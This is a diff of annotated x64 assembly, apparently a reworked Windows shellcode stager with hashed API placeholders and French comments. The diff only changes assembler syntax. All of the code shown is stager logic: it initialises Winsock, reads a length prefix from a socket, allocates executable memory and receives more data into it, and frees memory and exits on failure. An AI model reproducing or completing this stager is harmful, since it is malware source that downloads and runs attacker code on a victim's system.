@@ -131,7 +131,7 @@ save_beginning:
     pop rcx
     mov r10d,%HASH__ws2_32.dll__WSAStartup%   ; ws2_32.WSAStartup(0x101,WSADATA) (arguments à voir)
     call rbp            ; 2eme run
-    push byte +0xa
+    push byte 0xa
     pop r14
 
 to_rename_11f:
@@ -148,7 +148,7 @@ to_rename_11f:
     mov rdi,rax
 
 to_rename_13e:
-    push byte +0x10
+    push byte 0x10
     pop r8
     mov rdx,r12
     mov rcx,rdi
@@ -161,7 +161,7 @@ to_rename_13e:
     call to_rename_1f1
 
 to_rename_15e:
-    sub rsp,byte +0x10
+    sub rsp,byte 0x10
     mov rdx,rsp
     xor r9,r9
     push byte +0x4
@@ -169,13 +169,13 @@ to_rename_15e:
     mov rcx,rdi
     mov r10d,%HASH__ws2_32.dll__recv% ; ws2_32.recv(0xd0,?,0x4) le ? similaire à au dessus à chaque fois
     call rbp            ; 5eme run
-    cmp eax,byte +0x0
+    cmp eax,byte 0x0
     jng to_rename_1d1
     nop
-    add rsp,byte +0x20
+    add rsp,byte 0x20
     pop rsi
     mov esi,esi
-    push byte +0x40
+    push byte 0x40
     pop r9
     push qword 0x1000
     pop r8
@@ -193,14 +193,14 @@ to_rename_1a2:
     mov rcx,rdi
     mov r10d,%HASH__ws2_32.dll__recv% ; ws2_32.recv(0xd0,?,0x4) le ? similaire à au dessus à chaque fois
     call rbp            ; 7eme run
-    cmp eax,byte +0x0
+    cmp eax,byte 0x0
     jnl to_rename_1e3
     pop rax
     push r15
     pop rcx
     push qword 0x4000
     pop r8
-    push byte +0x0
+    push byte 0x0
     pop rdx
     mov r10d,%HASH__kernel32.dll__VirtualFree% ; kernel32.VirtualFree(?),0,0x4000)
     call rbp            ; 8eme run
@@ -221,7 +221,7 @@ to_rename_1e3:
 
 to_rename_1f1:
     pop rax
-    push byte +0x0
+    push byte 0x0
     pop rcx
     mov r10,%HASH__kernel32.dll__ExitProcess% ; kernel32.ExitProcess(0)
     call rbp                                 ; 10eme run
